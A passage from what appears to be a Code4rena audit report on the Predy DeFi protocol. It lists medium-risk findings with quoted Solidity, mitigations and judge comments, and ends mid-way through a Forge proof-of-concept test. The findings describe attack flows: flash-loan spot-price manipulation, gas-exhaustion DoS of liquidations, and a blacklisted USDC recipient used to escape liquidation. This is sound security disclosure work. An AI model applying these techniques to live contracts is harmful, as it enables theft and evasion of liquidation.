> I will maintain the high severity rating for this submission due to simply pointing out an egregious error in the code which, per relevant SC rulings, falls under the definition of a "high-risk" vulnerability.
> 
> While direct interaction may be possible, that never was the intended use of the markets and their being effectively inoperable in the regard described by the exhibit is a significant flaw.

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-05-predy-findings/issues/27).*
***

 
# Medium Risk Findings (8)
## [[M-01] Liquidity manipulation is possible when trading](https://github.com/code-423n4/2024-05-predy-findings/issues/157)
*Submitted by [Yunaci](https://github.com/code-423n4/2024-05-predy-findings/issues/157), also found by [Rhaydden](https://github.com/code-423n4/2024-05-predy-findings/issues/278), [crypticdefense](https://github.com/code-423n4/2024-05-predy-findings/issues/276), [Naresh](https://github.com/code-423n4/2024-05-predy-findings/issues/222), [kodyvim](https://github.com/code-423n4/2024-05-predy-findings/issues/185), [emmac002](https://github.com/code-423n4/2024-05-predy-findings/issues/172), [erictee](https://github.com/code-423n4/2024-05-predy-findings/issues/164), [WinSec](https://github.com/code-423n4/2024-05-predy-findings/issues/162), [ZanyBonzy](https://github.com/code-423n4/2024-05-predy-findings/issues/133), [Sparrow](https://github.com/code-423n4/2024-05-predy-findings/issues/130), [julian\_avantgarde](https://github.com/code-423n4/2024-05-predy-findings/issues/103), [lightoasis](https://github.com/code-423n4/2024-05-predy-findings/issues/74), [Bauchibred](https://github.com/code-423n4/2024-05-predy-findings/issues/310), and [Sathish9098](https://github.com/code-423n4/2024-05-predy-findings/issues/308)*

The  [Trade contract](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Trade.sol) lacks any checks against the retrieved price. It doesn't utilize TWAP. Consequently, an attacker can manipulate the spot price (`slot0`) through a flash loan attack. This manipulation can lead to highly inaccurate trade results and potential loss of funds for the users.

### Proof of Concept

The [Trade contract](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Trade.sol)  initiates the trading process by calling  [`Trade::trade()`](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Trade.sol#L32). This function sets the `tradeResult.sqrtPrice` by calling [`Trade::getSqrtPrice()`](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Trade.sol#L49).

The [`Trade::getSqrtPrice()`](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Trade.sol#L49) retrieves the `sqrtPrice` using the `uniswapPool` and the boolean  `isQuoteZero` as arguments.

Internally calls the [`UniHelper::getSqrtPrice()`](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Trade.sol#L113) function with the relevant parameters and returns the `sqrtPrice` calculated directly [using the spot price(`slot0`)](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/UniHelper.sol#L14), which an attacker can manipulate, which can lead to highly inaccurate trade results and potential loss of funds for the users.

<https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Trade.sol#L112C5-L114C6>

```solidity
/src/libraries/Trade.sol

112: function getSqrtPrice(address uniswapPoolAddress, bool isQuoteZero) internal view returns (uint256 sqrtPriceX96) {
113:         return UniHelper.convertSqrtPrice(UniHelper.getSqrtPrice(uniswapPoolAddress), isQuoteZero);
114:     }
```

<https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/UniHelper.sol#L13C4-L15C6>

```solidity
/src/libraries/UniHelper.sol

13:   function getSqrtPrice(address uniswapPoolAddress) internal view returns (uint160 sqrtPrice) {
14:        (sqrtPrice,,,,,,) = IUniswapV3Pool(uniswapPoolAddress).slot0();
15:   }
```

### Coded PoC

In order to run the test, go to `test/pool` and replace the content of `Trade.t.sol` with the one from the gist below. You can also delete the file and create a new one with its code.

<https://gist.github.com/Vancelott/198c4e9133a7ee5d4d6900471a9717f7>

Basic flow of the test:

1. Alice wants to initiate a trade in a specific pair.
2. After that, she simply calls [trade](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Trade.sol#L32).
3. A malicious user (Bob) tracks the protocol's mempool and notices the call.
4. Bob takes out a flash loan and adds liquidity to the Uniswap pool associated with the pair in Predy.
5. As the spot price is used within the calculations of the trade, Alice has traded for less tokens due to Bob's added liquidity.
6. Bob then withdraws his liquidity and pays back the flash loan.

### Recommended Mitigation Steps

Consider using the TWAP price instead of the spot price in order to prevent price manipulation.

**[syuhei176 (Predy) acknowledged and commented via duplicate Issue #74](https://github.com/code-423n4/2024-05-predy-findings/issues/74#issuecomment-2173749508):**
> To ensure that the price of the target Uniswap pool has not been manipulated during Squart transaction, we need to check slot0. Therefore, a `getSqrtPrice` function is necessary.

**[0xsomeone (judge) decreased severity to Medium](https://github.com/code-423n4/2024-05-predy-findings/issues/157#issuecomment-2197244343)**

**[0xsomeone (judge) commented via duplicate Issue #74](https://github.com/code-423n4/2024-05-predy-findings/issues/74#issuecomment-2197243764):**
 > The submission and its duplicates detail how it is dangerous to rely on the `slot0` to provide proper data for a particular trade.
>
> There is a particular code segment of the system that will utilize the `slot0` square root price at face value, and that is the execution of a `Trade::swap` with a net-zero `totalBaseAmount`. 
> 
> Liquidations and Gamma Market trade executions will properly apply slippage checks, but direct interaction with the `PredyPool` will not. Given that the allowlist can be disabled for a particular `pairId`, it infers that users would eventually be able to directly interact with the `PredyPool` and this would be unsafe to do so in case of a net-neutral trade interaction.
> 
> I believe a severity of medium is appropriate as trades will be affected, and at the very least the interaction by the user will utilize improper asset ratios when executed. The interactions within the `Perp` contract involved are complex, and I welcome the Sponsor to refute my understanding of the codebase at this point.

***

## [[M-02] `updateIRMParams` does not call `applyInterestForToken` before updating `irmParams` which leads to incorrect calculation of interest rate for subsequent trades.](https://github.com/code-423n4/2024-05-predy-findings/issues/134)
*Submitted by [WinSec](https://github.com/code-423n4/2024-05-predy-findings/issues/134), also found by [Tigerfrake](https://github.com/code-423n4/2024-05-predy-findings/issues/281), [0xhere2learn](https://github.com/code-423n4/2024-05-predy-findings/issues/200), TECHFUND-inc ([1](https://github.com/code-423n4/2024-05-predy-findings/issues/182), [2](https://github.com/code-423n4/2024-05-predy-findings/issues/181)), [SpicyMeatball](https://github.com/code-423n4/2024-05-predy-findings/issues/12), and [zhaojohnson](https://github.com/code-423n4/2024-05-predy-findings/issues/8)*

<https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/AddPairLogic.sol#L128><br><https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/AddPairLogic.sol#L96>

### Impact

Incorrect interest rate value will be calculated for future trades as the update to `irmParams` does not update the `lastUpdatedAt` or calculate the interest rate before updating the value of `irmParams`. This also results in the incorrect calculation of `totalProtocolFees`

### Proof of Concept

Consider the function `updateIRMParams`. This is called from the PredyPool contract which internally calls this function in the `AddPairLogic` contract:

```solidity
    function updateIRMParams(
        DataType.PairStatus storage _pairStatus,
        InterestRateModel.IRMParams memory _quoteIrmParams,
        InterestRateModel.IRMParams memory _baseIrmParams
    ) external {
        validateIRMParams(_quoteIrmParams);
        validateIRMParams(_baseIrmParams);

        _pairStatus.quotePool.irmParams = _quoteIrmParams;
        _pairStatus.basePool.irmParams = _baseIrmParams;

        emit IRMParamsUpdated(_pairStatus.id, _quoteIrmParams, _baseIrmParams);
    }
```

It validates the `IRMParams` and updates it. But, there is an issue in doing so. Before the `IRMParams` is updated, `applyInterestForToken` in `ApplyInterestLib` should be called first. It's not being called.

`applyInterestForToken` first calls the function `applyInterestForPoolStatus` twice (for `quotepool` and `basepool`) and then `applyInterestForToken` also updates the `lastUpdateTimestamp` to `block.timestamp`.

In `applyInterestForPoolStatus`:

```solidity
    function applyInterestForPoolStatus(Perp.AssetPoolStatus storage poolStatus, uint256 lastUpdateTimestamp, uint8 fee)
        internal
        returns (uint256 interestRate, uint256 totalProtocolFee)
    {
        if (block.timestamp <= lastUpdateTimestamp) {
            return (0, 0);
        }

        uint256 utilizationRatio = poolStatus.tokenStatus.getUtilizationRatio();

        // Skip calculating interest if utilization ratio is 0
        if (utilizationRatio == 0) {
            return (0, 0);
        }

        // Calculates interest rate
        interestRate = InterestRateModel.calculateInterestRate(poolStatus.irmParams, utilizationRatio)
            * (block.timestamp - lastUpdateTimestamp) / 365 days;

        totalProtocolFee = poolStatus.tokenStatus.updateScaler(interestRate, fee);

        poolStatus.accumulatedProtocolRevenue += totalProtocolFee / 2;
        poolStatus.accumulatedCreatorRevenue += totalProtocolFee / 2;
    }
```

Note this line:

            interestRate = InterestRateModel.calculateInterestRate(poolStatus.irmParams, utilizationRatio)
                * (block.timestamp - lastUpdateTimestamp) / 365 days;

The `irmParams` params are used to calculate the `interestRate`, which is then further used to calculate the `protocolFee`.

So, the period between `block.timestamp - lastUpdateTimestamp` is supposed to use the current `poolStatus.params` to calculate the interest rate. But, when `updateIRMParams` are directly updated, without first calling `applyInterestForToken`, any time a new trade is opened, it will be using the updated values of `irmParams` to calculate the interest rate for the current time period instead of using the previous values. This is problematic.

For example, if the previous values of `slope1` and `slope2` were smaller in the previous values of `irmParams`, then the `interestRate` calculated would be smaller. But, if the new updated values of `irmParams` (`slope1` and `slope2`) were bigger, then the interest rate would become bigger. But, for the current time period (`block.timestamp - lastUpdateTimestamp`), this indicates a step-wise jump in the calculation of `interestRate`. A higher interest rate is being calculated than intended for the current period. This directly affects the calculation of the `totalProtocolFees` as well.

This can be seen in the graph below:

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-05-predy-findings/issues/134).*

Consider that the interest rate is the area under the graph. The first one represents the current case, where `applyInterestForToken` is not called before the params are updated. In the second case, `applyInterestForToken` is called first before updating. It's clear from the graphs that the first case is considering a higher value of interest rate because of a larger area, which is incorrect.

The same argument can be made for the `updateFeeRatio` function as well. The current time period must use the previous `feeRatio` to account for accurate fee calculation. So, before `feeRatio` is updated, it should also call the `applyInterestForToken` function.

### Recommended Mitigation Steps

While updating the params, the `applyInterestForToken` function should be called first for the current period to calculate the `interestRate` from `block.timestamp` to `lastUpdateTimestamp`, and then the updated value of `irmParams` can be used for durations after this `block.timestamp`.

The same should be done for the `updateFeeRatio` function.

**[syuhei176 (Predy) confirmed via duplicate Issue #12](https://github.com/code-423n4/2024-05-predy-findings/issues/12#event-13193809143)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/134#issuecomment-2197314222):**
 > The submission and its duplicates have demonstrated how an update of the protocol's IRM parameters is not preceded by an interest update, permitting the updated variables to retroactively apply to the time elapsed since the last interest rate update incorrectly.
> 
> I believe a medium-risk severity rating is appropriate given that all IRM reconfigurations will lead to interest rates being improperly tracked in the system.

***

## [[M-03] Incorrect price for negative ticks due to lack of rounding down](https://github.com/code-423n4/2024-05-predy-findings/issues/115)
*Submitted by [josephdara](https://github.com/code-423n4/2024-05-predy-findings/issues/115), also found by Rhaydden ([1](https://github.com/code-423n4/2024-05-predy-findings/issues/306), [2](https://github.com/code-423n4/2024-05-predy-findings/issues/279)), [Tigerfrake](https://github.com/code-423n4/2024-05-predy-findings/issues/289), [Naresh](https://github.com/code-423n4/2024-05-predy-findings/issues/237), [Bauchibred](https://github.com/code-423n4/2024-05-predy-findings/issues/233), [ayden](https://github.com/code-423n4/2024-05-predy-findings/issues/204), [ZanyBonzy](https://github.com/code-423n4/2024-05-predy-findings/issues/197), [SBSecurity](https://github.com/code-423n4/2024-05-predy-findings/issues/188), [kodyvim](https://github.com/code-423n4/2024-05-predy-findings/issues/186), [WinSec](https://github.com/code-423n4/2024-05-predy-findings/issues/167), [Kaysoft](https://github.com/code-423n4/2024-05-predy-findings/issues/151), [Giorgio](https://github.com/code-423n4/2024-05-predy-findings/issues/139), [jolah1](https://github.com/code-423n4/2024-05-predy-findings/issues/135), [0xhashiman](https://github.com/code-423n4/2024-05-predy-findings/issues/127), [0xabhay](https://github.com/code-423n4/2024-05-predy-findings/issues/111), [Sparrow](https://github.com/code-423n4/2024-05-predy-findings/issues/90), [0xhere2learn](https://github.com/code-423n4/2024-05-predy-findings/issues/65), and [grearlake](https://github.com/code-423n4/2024-05-predy-findings/issues/2)*

The function `callUniswapObserve` is used to get twap price tick using `IUniswapV3PoolOracle.observe.selector` which is then used to calculate the `int24 tick`.

The problem is that in case if `(tickCumulatives[1] - tickCumulatives[0])` is negative, the tick should be rounded down as it's done in the `OracleLibrary` from uniswap.

As result, in case if `(tickCumulatives[1] - tickCumulatives[0])`is negative and `(tickCumulatives[1] - tickCumulatives[0]) % secondsAgo != 0`, then returned tick will be bigger then it should be, hence incorrect prices would be used.

### Proof of Concept

`Unihelper:::callUniswapObserve()`:

```solidity
        int56[] memory tickCumulatives = abi.decode(data, (int56[]));

        int24 tick = int24((tickCumulatives[1] - tickCumulatives[0]) / int56(int256(ago)));

        uint160 sqrtPriceX96 = TickMath.getSqrtRatioAtTick(tick);
```

In Uniswap's `OracleLibrary:::consult()`:

```solidity
        int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];
        uint160 secondsPerLiquidityCumulativesDelta =
            secondsPerLiquidityCumulativeX128s[1] - secondsPerLiquidityCumulativeX128s[0];

        arithmeticMeanTick = int24(tickCumulativesDelta / secondsAgo);
        // Always round to negative infinity
        if (tickCumulativesDelta < 0 && (tickCumulativesDelta % secondsAgo != 0)) arithmeticMeanTick--;
```

### Tools Used

Solodit

### Recommended Mitigation Steps

Round down the `int24 tick`:

```solidity
if (tickCumulativesDelta < 0 && (tickCumulativesDelta % secondsAgo != 0)) tick--;
```

### Assessed type

Math

**[syuhei176 (Predy) confirmed via duplicate Issue #65](https://github.com/code-423n4/2024-05-predy-findings/issues/65#event-13208488411)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/115#issuecomment-2197280490):**
 > The Warden and its peers have demonstrated that the DEX price feed calculation does not round properly, resulting in a deviation of as much as one tick which, depending on the spacing of the pool, can be significant.
> 
> As such, I believe a medium risk rating is appropriate for this submission.

***

## [[M-04] Chainlink's `latestRoundData` might return stale or incorrect results](https://github.com/code-423n4/2024-05-predy-findings/issues/69)
*Submitted by [0xb0k0](https://github.com/code-423n4/2024-05-predy-findings/issues/69), also found by [Tigerfrake](https://github.com/code-423n4/2024-05-predy-findings/issues/297), [Bigsam](https://github.com/code-423n4/2024-05-predy-findings/issues/291), [MSaptarshi](https://github.com/code-423n4/2024-05-predy-findings/issues/287), [JC](https://github.com/code-423n4/2024-05-predy-findings/issues/267), [Kaysoft](https://github.com/code-423n4/2024-05-predy-findings/issues/250), [unix515](https://github.com/code-423n4/2024-05-predy-findings/issues/248), [Pelz](https://github.com/code-423n4/2024-05-predy-findings/issues/246), [0xHash](https://github.com/code-423n4/2024-05-predy-findings/issues/243), Norah ([1](https://github.com/code-423n4/2024-05-predy-findings/issues/241), [2](https://github.com/code-423n4/2024-05-predy-findings/issues/239)), [Bauchibred](https://github.com/code-423n4/2024-05-predy-findings/issues/230), [biakia](https://github.com/code-423n4/2024-05-predy-findings/issues/225), [nnez](https://github.com/code-423n4/2024-05-predy-findings/issues/221), [mt030d](https://github.com/code-423n4/2024-05-predy-findings/issues/215), [ayden](https://github.com/code-423n4/2024-05-predy-findings/issues/211), [Neo\_Granicen](https://github.com/code-423n4/2024-05-predy-findings/issues/207), [0xAkira](https://github.com/code-423n4/2024-05-predy-findings/issues/206), [golu](https://github.com/code-423n4/2024-05-predy-findings/issues/193), atoko ([1](https://github.com/code-423n4/2024-05-predy-findings/issues/179), [2](https://github.com/code-423n4/2024-05-predy-findings/issues/177)), [emmac002](https://github.com/code-423n4/2024-05-predy-findings/issues/175), [WinSec](https://github.com/code-423n4/2024-05-predy-findings/issues/171), [y0ng0p3](https://github.com/code-423n4/2024-05-predy-findings/issues/169), [web3km](https://github.com/code-423n4/2024-05-predy-findings/issues/143), [steadyman](https://github.com/code-423n4/2024-05-predy-findings/issues/131), [0xMilenov](https://github.com/code-423n4/2024-05-predy-findings/issues/126), [Naresh](https://github.com/code-423n4/2024-05-predy-findings/issues/119), [josephdara](https://github.com/code-423n4/2024-05-predy-findings/issues/118), [Eeyore](https://github.com/code-423n4/2024-05-predy-findings/issues/110), [lydia\_m\_t](https://github.com/code-423n4/2024-05-predy-findings/issues/104), [Abhan](https://github.com/code-423n4/2024-05-predy-findings/issues/96), [0xabhay](https://github.com/code-423n4/2024-05-predy-findings/issues/94), [Tripathi](https://github.com/code-423n4/2024-05-predy-findings/issues/89), [dyoff](https://github.com/code-423n4/2024-05-predy-findings/issues/83), [pkqs90](https://github.com/code-423n4/2024-05-predy-findings/issues/29), [shaflow2](https://github.com/code-423n4/2024-05-predy-findings/issues/21), [SpicyMeatball](https://github.com/code-423n4/2024-05-predy-findings/issues/13), [Sathish9098](https://github.com/code-423n4/2024-05-predy-findings/issues/309), [forgebyola](https://github.com/code-423n4/2024-05-predy-findings/issues/120), [Sparrow](https://github.com/code-423n4/2024-05-predy-findings/issues/100), [ZanyBonzy](https://github.com/code-423n4/2024-05-predy-findings/issues/307), and [0xlucky](https://github.com/code-423n4/2024-05-predy-findings/issues/91)*

In the `PriceFeed` contract, the protocol uses a ChainLink aggregator to fetch the `latestRoundData()`, but there is no check if the return value indicates stale data. The only check present is for the `quoteAnswer` to be `> 0`; however, this alone is not sufficient.

```solidity
function getSqrtPrice() external view returns (uint256 sqrtPrice) {
@>        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData(); // missing additional checks

        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff;

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
```

The protocol mentions that:

> Attacks that stem from the TWAP being extremely stale compared to the market price within its period (currently 30 minutes) are a known risk. As a general rule, only price manipulation issues that can be triggered by manipulating the price atomically from a normal pool or oracle state are valid.

However, this `stale` period check is only currently applied to the `Pyth` integration, where the ChainLink feed is not considered for stale data.

This could lead to stale prices according to the Chainlink documentation [here](https://docs.chain.link/docs/historical-price-data/#historical-rounds).

This discrepancy could have the protocol produce incorrect values for very important functions in different places across the system, such as `GammaTradeMarket`, `PositionCalculator`, `LiquidationLogic`, etc.

### Proof of Concept

<https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L46><br><https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/PositionCalculator.sol#L141>

### Recommended Mitigation Steps

Consider adding missing checks for stale data:

```diff
@@ -43,7 +43,10 @@ contract PriceFeed {
 
     /// @notice This function returns the square root of the baseToken price quoted in quoteToken.
     function getSqrtPrice() external view returns (uint256 sqrtPrice) {
-        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();
+        (uint80 quoteRoundID, int256 quoteAnswer,, uint256 quoteTimestamp, uint80 quoteAnsweredInRound) =
+            AggregatorV3Interface(_quotePriceFeed).latestRoundData();
+        require(quoteAnsweredInRound >= quoteRoundID, "Stale price!");
+        require(quoteTimestamp != 0, "Round not complete!");
+        require(block.timestamp - quoteTimestamp <= VALID_TIME_PERIOD);
```

### Assessed type

Oracle

**[syuhei176 (Predy) confirmed](https://github.com/code-423n4/2024-05-predy-findings/issues/69#event-13187998137)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/69#issuecomment-2197270583):**
 > The Warden has demonstrated how the Chainlink oracle employed by the system does not impose any staleness check, permitting misbehavior in the Chainlink system to not be detected by the system and the system to continue utilizing a stale price, similar to the Luna flash crash.
> 
> I believe a medium-risk rating is appropriate given the low likelihood of such an event but the devastating consequences it could result in.
> 
> A subset of the duplicates have been penalized for not properly justifying why the staleness check should be applied, for advising an incorrect alleviation (i.e., round ID based), and/or for being of lower quality than acceptable.

***

## [[M-05] Possible DoS When calling `GammaTradeMarket::_removePosition` will cause user position to not be able to get liquidated](https://github.com/code-423n4/2024-05-predy-findings/issues/55)
*Submitted by [web3km](https://github.com/code-423n4/2024-05-predy-findings/issues/55), also found by [crypticdefense](https://github.com/code-423n4/2024-05-predy-findings/issues/275), [nnez](https://github.com/code-423n4/2024-05-predy-findings/issues/216), [3n0ch](https://github.com/code-423n4/2024-05-predy-findings/issues/59), and [pkqs90](https://github.com/code-423n4/2024-05-predy-findings/issues/43)*

<https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/markets/gamma/ArrayLib.sol#L20-L32><br><https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/markets/gamma/GammaTradeMarket.sol#L146-L149>

### Impact

Griefing/DOS attack is possible when, a malicious user creates many very small positions, which could cause excessive gas consumed and even transactions reverted when other users are trying to liquidate any of the user's positions.

### Proof of Concept

The function `GammaTradeMarket.sol:_removePosition` is using the `ArrayLib::removeItem`, which is currently just looping over the items, until it finds the one it's looking for.

```solidity
function _removePosition(uint256 positionId) internal {x
        address trader = userPositions[positionId].owner;

@>        positionIDs[trader].removeItem(positionId);
    }
```

```solidity
 function removeItem(uint256[] storage items, uint256 item) internal {
        uint256 index = getItemIndex(items, item);

        removeItemByIndex(items, index);
    }
...

    function getItemIndex(uint256[] memory items, uint256 item) internal pure returns (uint256) {
        uint256 index = type(uint256).max;

        //@review - If items length is bigger, it could revert due to reaching block gas limit
        for (uint256 i = 0; i < items.length; i++) {
            if (items[i] == item) {
                index = i;
                break;
            }
        }

        return index;
    }
```

This function is called multiple times inside of `GammaTradeMarket.sol`, it is called right after calling `GammaTradeMarket::execLiquidationCall`.

```solidity
function execLiquidationCall(
        uint256 vaultId,
        uint256 closeRatio,
        IFillerMarket.SettlementParamsV3 memory settlementParams
    ) external override returns (IPredyPool.TradeResult memory tradeResult) {
        tradeResult =
            _predyPool.execLiquidationCall(vaultId, closeRatio, _getSettlementDataFromV3(settlementParams, msg.sender));

        if (closeRatio == 1e18) {
@>           _removePosition(vaultId);
        }
    }
```

A malicious user can create many really small positions with very little leverage to make sure those position will hardly be liquidated and the create, a normal position with a good amount of leverage. As a result every liquidator who tries to liquidate the user's position will most likely fail, since the array's length is too big and the position they want to liquidate is at the last place of the array.

### Recommended Mitigation Steps

Consider using [OZ's EnumerableSet Library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol), which will allow to add/remove items easily without the need to loop over every item to find the one that needs to be removed.

### Assessed type

DoS

**[syuhei176 (Predy) confirmed](https://github.com/code-423n4/2024-05-predy-findings/issues/55#event-13193977455)**

**[0xsomeone (judge) commented via duplicate Issue #59](https://github.com/code-423n4/2024-05-predy-findings/issues/59#issuecomment-2197286473):**
 > A user can maliciously craft their positions in a way that would breach the block gas limit if a user were to iterate through all of them, thereby causing fillers to be unable to fulfill trades for the account and liquidators to be unable to iterate a user's positions.
> 
> Given that liquidations can be affected as well, the present vulnerability permits a user to craft their position array in such a way that would prevent their liquidation. This misbehavior would usually result in a high-risk severity rating, however, as some submissions noted, this Denial-of-Service can be circumvented via partial liquidations up to the maximum accuracy possible which would not render it a viable strategy. As such, a medium-risk rating is better suited for both functionalities impacted.

***

## [[M-06] Vaults can become immune from liquidation by setting `vault.recipient` to a blacklisted quote token address](https://github.com/code-423n4/2024-05-predy-findings/issues/42)
*Submitted by [LuarSec](https://github.com/code-423n4/2024-05-predy-findings/issues/42), also found by [Tigerfrake](https://github.com/code-423n4/2024-05-predy-findings/issues/296), [Kaysoft](https://github.com/code-423n4/2024-05-predy-findings/issues/218), [Takarez](https://github.com/code-423n4/2024-05-predy-findings/issues/201), [0xhere2learn](https://github.com/code-423n4/2024-05-predy-findings/issues/199), [ayden](https://github.com/code-423n4/2024-05-predy-findings/issues/196), [SBSecurity](https://github.com/code-423n4/2024-05-predy-findings/issues/187), [erictee](https://github.com/code-423n4/2024-05-predy-findings/issues/165), [DPS](https://github.com/code-423n4/2024-05-predy-findings/issues/150), [Joshuajee](https://github.com/code-423n4/2024-05-predy-findings/issues/148), [dyoff](https://github.com/code-423n4/2024-05-predy-findings/issues/140), [0xMilenov](https://github.com/code-423n4/2024-05-predy-findings/issues/124), [forgebyola](https://github.com/code-423n4/2024-05-predy-findings/issues/121), [pkqs90](https://github.com/code-423n4/2024-05-predy-findings/issues/39), [gumgumzum](https://github.com/code-423n4/2024-05-predy-findings/issues/24), [shaflow2](https://github.com/code-423n4/2024-05-predy-findings/issues/20), [SpicyMeatball](https://github.com/code-423n4/2024-05-predy-findings/issues/15), [zhaojohnson](https://github.com/code-423n4/2024-05-predy-findings/issues/6), [MSaptarshi](https://github.com/code-423n4/2024-05-predy-findings/issues/288), [MrCrowNFT](https://github.com/code-423n4/2024-05-predy-findings/issues/202), [jolah1](https://github.com/code-423n4/2024-05-predy-findings/issues/190), [WinSec](https://github.com/code-423n4/2024-05-predy-findings/issues/166), [EaglesSecurity](https://github.com/code-423n4/2024-05-predy-findings/issues/138), [lydia\_m\_t](https://github.com/code-423n4/2024-05-predy-findings/issues/48), and [chista0x](https://github.com/code-423n4/2024-05-predy-findings/issues/155)*

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PredyPool.sol#L289<br><https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L99>

### Impact

Vault owners can set `vault.recipient` via the external `PredyPool.updateRecepient` function to set the address that will receive the vault's remaining positive margin when the vault's position is liquidated, denominated in the quote token:

```solidity

    //File:///src/PredyPool.sol

    function updateRecepient(uint256 vaultId, address recipient) external onlyVaultOwner(vaultId) {
        DataType.Vault storage vault = globalData.vaults[vaultId];

        vault.recipient = recipient;

        emit RecepientUpdated(vaultId, recipient);
    }
```

A malicious vault owner can set `vault.recipient` to a blacklisted/prohibited address for the quote token, such as [`0x0E6b8E34dC115a2848F585851AF23D99D09b8463`](https://arbiscan.io/token/0xaf88d065e77c8cc2239327c5edb3a432268e5831#readProxyContract#F12), which is blacklisted in Arbitrum's USDC contract. If the remaining margin is positive, the `safeTransfer` operation on line 97 in `LiquidationLogic.liquidate` may revert, as is the case with USDC:

```solidity

    //File:///src/libraries/logic/LiquidationLogic.sol

    function liquidate(
        uint256 vaultId,
        uint256 closeRatio,
        GlobalDataLibrary.GlobalData storage globalData,
        bytes memory settlementData
    ) external returns (IPredyPool.TradeResult memory tradeResult) {
        ...

        if (!hasPosition) {
            int256 remainingMargin = vault.margin;

            if (remainingMargin > 0) {
                if (vault.recipient != address(0)) {
                    // Send the remaining margin to the recipient.
                    vault.margin = 0;

                    sentMarginAmount = uint256(remainingMargin);

                    ERC20(pairStatus.quotePool.token).safeTransfer(vault.recipient, sentMarginAmount);
                }
            ...
            }
        }
    }
```

As a new vault can be created when making a trade, any malicious user can maintain their own vault for a trade. The owner of a vault at risk of liquidation with a positive `vault.margin` can effectively "switch off" liquidations at will if the quote token reverts when sending tokens to blacklisted addresses, preventing the entire liquidation operation from succeeding.

This results in unsafe unliquidatable vault positions remaining in the protocol, putting both the protocol and its users at risk. This can be abused in several ways:

- Malicious vault owners can frontrun liquidation attempts with their own calls to `PredyPool.updateRecepient` to set `vault.recipient` to a blacklisted quote token address, optionally reverting the change after the liquidation attempt fails.
- Malicious market maintainers may be able to game the PredyPool contract by automatically setting vault recipients to blacklisted addresses at the expense of liquidators, the protocol, and other markets.
- Malicious vault owners can deliberately maintain unhealthy liquidation-proof positions with the goal of driving up the protocol's total margin.

### Proof of Concept

The following Forge test case `test_audit_LiquidateBlacklist` and modifications can be added to [test/pool/ExecLiquidationCall.t.sol](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/test/pool/ExecLiquidationCall.t.sol) and [test/mocks/MockERC20.sol](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/test/mocks/MockERC20.sol) to simulate a liquidator being prevented from liquidating the unsafe position.

Note that in the provided test setup, `closeRatio` needed to be `1e18` to get `remainingMargin` over zero in line 92 of [LiquidationLogic](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L92); however, it is believed that the required ratio range for a positive `remainingMargin` will be wider under real market conditions.

**`test/pool/ExecLiquidationCall.t.sol`**:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Setup.t.sol";
import "../mocks/TestTradeMarket.sol";
import {SlippageLib} from "../../src/libraries/SlippageLib.sol";

contract TestExecLiquidationCall is TestPool {
    ...
    address liquidator;

    function setUp() public override {
        ...
        liquidator = makeAddr("liquidator");
        currency0.mint(liquidator, 1e10);
        currency1.mint(liquidator, 1e10);
        vm.startPrank(liquidator);
        currency0.approve(address(_tradeMarket), 1e10);
        currency1.approve(address(_tradeMarket), 1e10);
        vm.stopPrank();
    }

    ...
    // @note malicious user is this contract address, _tradeMarket is their malicious market/trading contract.
    function test_audit_LiquidateBlacklist() public {
        address blacklisted = 0x0E6b8E34dC115a2848F585851AF23D99D09b8463;
        // taken from testLiquidateSucceedsIfVaultIsDanger case
        IPredyPool.TradeParams memory tradeParams =
            IPredyPool.TradeParams(1, 0, -4 * 1e8, 0, abi.encode(_getTradeAfterParams(1e8)));

        // malicious user trades through their own market contract
        _tradeMarket.trade(tradeParams, _getSettlementData(Constants.Q96));

        // simulate unfavorable market move
        _movePrice(true, 6 * 1e16);
        vm.warp(block.timestamp + 30 minutes);

        // malicious user sets their vault.recipient to blacklisted address
        vm.startPrank(address(_tradeMarket));
        predyPool.updateRecepient(1, blacklisted);
        vm.stopPrank();

